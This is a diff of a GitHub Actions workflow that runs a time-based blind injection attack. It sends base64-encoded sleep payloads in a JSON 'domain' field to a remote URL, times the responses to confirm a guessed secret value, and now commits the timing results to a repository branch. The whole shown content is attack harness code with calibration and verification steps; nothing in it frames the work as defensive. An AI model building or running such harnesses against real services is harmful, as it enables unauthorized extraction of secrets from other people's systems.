@@ -39,16 +39,20 @@ jobs:
             local t0=$(date +%s%3N)
             curl -s -X POST "$url" -H "Content-Type: application/json" -d "{\"domain\":\"$INJ\"}" > /dev/null
             local t1=$(date +%s%3N)
-            echo "$label $((t1-t0))ms"
+            local dt=$((t1-t0))
+            echo "$label ${dt}ms"
+            echo "$label ${dt}ms" >> verify.txt
           }
 
+          echo "# verify candidate 3e5sik4gtjgpz864" > verify.txt
           run_timed "cal_sleep0" "$B64_CAL0"
           run_timed "cal_sleep4" "$B64_CAL4"
           run_timed "verify" "$B64_VERIFY"
 
-      - name: Save results
+      - name: Commit results
         run: |
-          # Results are printed in the step above, readable from workflow logs
-          echo "Candidate: 3e5sik4gtjgpz864"
-          echo "Expected: verify ~12000ms if correct (overhead~2017 + sleep10000)"
-          echo "Expected: verify ~4017ms if wrong (overhead~2017 + sleep2000)"
+          git config user.email "bot@github-actions"
+          git config user.name "GitHub Actions"
+          git add verify.txt
+          git commit -m "verify results" || echo "Nothing to commit"
+          git push origin corgi
